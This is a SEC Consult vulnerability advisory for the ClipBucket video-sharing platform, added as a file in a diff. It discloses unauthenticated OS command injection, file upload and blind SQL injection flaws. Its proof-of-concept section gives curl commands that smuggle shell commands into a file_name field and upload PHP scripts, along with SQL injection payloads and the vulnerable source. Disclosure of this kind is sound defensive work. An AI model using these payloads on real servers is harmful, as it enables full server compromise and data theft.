@@ -1,0 +1,245 @@
+SEC Consult Vulnerability Lab Security Advisory < 20180227-0 >
+=======================================================================
+              title: OS command injection, arbitrary file upload & SQL injection
+            product: ClipBucket
+ vulnerable version: <4.0.0 - Release 4902
+      fixed version: 4.0.0 - Release 4902
+         CVE number: -
+             impact: critical
+           homepage: http://clipbucket.com/
+              found: 2017-09-06
+                 by: Ahmad Ramadhan Amizudin (Office Kuala Lumpur)
+                     Wan Ikram (Office Kuala Lumpur)
+                     Fikri Fadzil (Office Kuala Lumpur)
+                     Jasveer Singh (Office Kuala Lumpur)
+                     SEC Consult Vulnerability Lab
+
+                     An integrated part of SEC Consult
+                     Bangkok - Berlin - Linz - Luxembourg - Montreal
+                     Moscow - Munich - Kuala Lumpur - Singapore
+                     Vienna (HQ) - Vilnius - Zurich
+
+                     https://www.sec-consult.com
+
+=======================================================================
+
+Vendor description:
+-------------------
+"ClipBucket is a free and open source software which helps us to create a
+complete video sharing website like YouTube, Dailymotion, Metacafe, Veoh, Hulu
+in few minutes of setup. It was first created in 2007 by Arslan Hassan and his
+team of developers. ClipBucket was developed as a YouTube clone but has been
+upgraded with advanced features and enhancements. It uses FFMPEG for video
+conversion and thumbs generation which is the most widely used application so,
+users can stream it straight away using the Video JS and HTML 5 Players."
+
+Source: https://clipbucket.com/about
+
+
+Business recommendation:
+------------------------
+By exploiting the vulnerabilities documented in this advisory, an attacker can
+fully compromise the web server which has ClipBucket installed. Potentially
+sensitive data might get exposed through this attack.
+
+Users are advised to immediately install the patched version provided by the
+vendor.
+
+
+Vulnerability overview/description:
+-----------------------------------
+1. Unauthenticated OS Command Injection
+Any OS commands can be injected by an unauthenticated attacker. This is a serious
+vulnerability as the chances for the system to be fully compromised is very
+high. This same vulnerability can also be exploited by authenticated attackers
+with normal user privileges.
+
+2. Unauthenticated Arbitrary File Upload
+A malicious file can be uploaded into the webserver by an unauthenticated
+attacker. It is possible for an attacker to upload a script to issue operating
+system commands. This same vulnerability can also be exploited by an
+authenticated attacker with normal user privileges.
+
+3. Unauthenticated Blind SQL Injection
+The identified SQL injection vulnerabilities enable an attacker to execute
+arbitrary SQL commands on the underlying MySQL server.
+
+
+Proof of concept:
+-----------------
+1. Unauthenticated OS Command Injection
+Without having to authenticate, an attacker can exploit this vulnerability
+by manipulating the "file_name" parameter during the file upload in the script
+/api/file_uploader.php:
+
+ $ curl -F "Filedata=@pfile.jpg" -F "file_name=aa.php ||<<COMMAND HERE>>"
+http://$HOST/api/file_uploader.php
+
+
+Alternatively, this vulnerability can also be exploited by authenticated basic
+privileged users with the following payload by exploiting the same issue in
+/actions/file_downloader.php:
+
+$ curl --cookie "[--SNIP--]" --data "file=http://localhost/vid.mp4&file_name=abc
+|| <<COMMAND HERE>>" "http://$HOST/actions/file_downloader.php"
+
+
+2. Unauthenticated Arbitrary File Upload
+Below is the cURL request to upload arbitrary files to the webserver with no
+authentication required.
+
+$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
+"http://$HOST/actions/beats_uploader.php"
+
+$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
+"http://$HOST/actions/photo_uploader.php"
+
+Furthermore, this vulnerability is also available to authenticated users with
+basic privileges:
+
+$ curl --cookie "[--SNIP--]" -F
+"coverPhoto=@valid-image-with-appended-phpcode.php"
+"http://$HOST/edit_account.php?mode=avatar_bg"
+
+
+3. Unauthenticated Blind SQL Injection
+The following parameters have been identified to be vulnerable against
+unauthenticated blind SQL injection.
+
+URL     : http://$HOST/actions/vote_channel.php
+METHOD  : POST
+PAYLOAD : channelId=channelId=1-BENCHMARK(100000000, rand())
+
+The source code excerpt below shows the vulnerable code
+VULN. FILE : /actions/vote_channel.php
+VULN. CODE :
+[...]
+$vote = $_POST["vote"];
+$userid = $_POST["channelId"];
+//if($userquery->login_check('',true)){
+if($vote == "yes"){
+    $query = "UPDATE " . tbl("users") . " SET voted = voted + 1, likes = likes + 1
+WHERE userid = {$userid}";
+}else{
+    //$query = "UPDATE " . tbl("users") . " SET likes = likes (- 1) WHERE userid =
+{$userid}";
+    $sel = "Select userid,username,likes From ".tbl("users")." WHERE userid =
+{$userid}";
+    $result = $db->Execute($sel);
+     foreach ($result as $row )
+        $current_likes = $row['likes'];
+        $decremented_like = $current_likes-1;
+     $query = "Update ".tbl("users")." Set likes = $decremented_like Where userid
+= $userid";
+}
+[...]
+
+URL     : http://$HOST/ajax/commonAjax.php
+METHOD  : POST
+PAYLOAD : mode=emailExists&email=1' or '1'='1
+
+The source code excerpt below shows the vulnerable code
+VULN. FILE : /ajax/commonAjax.php
+VULN. CODE :
+[...]
+$email = $_POST['email'];
+$check = $db->select(tbl('users'),"email"," email='$email'");
+if (!$check) {
+    echo "NO";
+}
+[...]
+
+URL     : http://$HOST/ajax/commonAjax.php
+METHOD  : POST
+PAYLOAD : mode=userExists&username=1' or '1'='1
+
+The source code excerpt below shows the vulnerable code
+VULN. FILE : /ajax/commonAjax.php
+VULN. CODE :
+[...]
+$username = $_POST['username'];
+$check = $db->select(tbl('users'),"username"," username='$username'");
+if (!$check) {
+    echo "NO";
+}
+[...]
+
+
+Vulnerable / tested versions:
+-----------------------------
+Clipbucket version 2.8.3 and version 4.0.0 have been tested. These versions were
+the latest at the time the security vulnerabilities were discovered.
+
+
+Vendor contact timeline:
+------------------------
+2017-10-17: Contacting vendor through email.
+2017-10-18: Vendor asking for additional details.
+2017-10-19: Replied to vendor.
+2017-10-26: Request update from vendor, no response.
+2017-11-09: Request update from vendor.
+2017-11-09: Vendor response with security patches.
+2017-11-10: Notified vendor the security patches don't fix the reported issues
+2017-11-30: Request update from vendor.
+2017-11-30: Vendor requesting for support via Skype
+2017-12-07: Response to vendor.
+2018-01-22: Checking version 4.0.0, vulnerabilities not fixed, asking vendor again
+2018-01-22: Vendor provides latest patches, scheduled for future release
+2018-01-26: Verified that the patches don't fully mitigate all issues.
+2018-01-29: Request update from vendor, no response.
+2018-02-06: Request update from vendor, no response.
+2018-02-08: Informing vendor of public release date
+2018-02-08: Vendor: Stable v4.0 including security fixes will be released in
+            two weeks; postponing once again for two weeks
+2018-02-23: Request update from vendor.
+2018-02-26: Vendor publishes v4.0
+2018-02-27: Public release of security advisory
+
+
+
+Solution:
+---------
+The vendor provided the following patched version:
+https://github.com/arslancb/clipbucket/releases/download/4902/clipbucket-4902.zip
+
+
+Workaround:
+-----------
+None
+
+
+Advisory URL:
+-------------
+https://www.sec-consult.com/en/vulnerability-lab/advisories/index.html
+
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+SEC Consult Vulnerability Lab
+
+SEC Consult
+Bangkok - Berlin - Linz - Luxembourg - Montreal
+Moscow - Munich - Kuala Lumpur - Singapore
+Vienna (HQ) - Vilnius - Zurich
+
+About SEC Consult Vulnerability Lab
+The SEC Consult Vulnerability Lab is an integrated part of SEC Consult. It
+ensures the continued knowledge gain of SEC Consult in the field of network
+and application security to stay ahead of the attacker. The SEC Consult
+Vulnerability Lab supports high-quality penetration testing and the evaluation
+of new offensive and defensive technologies for our customers. Hence our
+customers obtain the most current information about vulnerabilities and valid
+recommendation about the risk profile of new technologies.
+
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+Interested to work with the experts of SEC Consult?
+Send us your application https://www.sec-consult.com/en/career/index.html
+
+Interested in improving your cyber security with the experts of SEC Consult?
+Contact our local offices https://www.sec-consult.com/en/contact/index.html
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Mail: research at sec-consult dot com
+Web: https://www.sec-consult.com
+Blog: http://blog.sec-consult.com
+Twitter: https://twitter.com/sec_consult
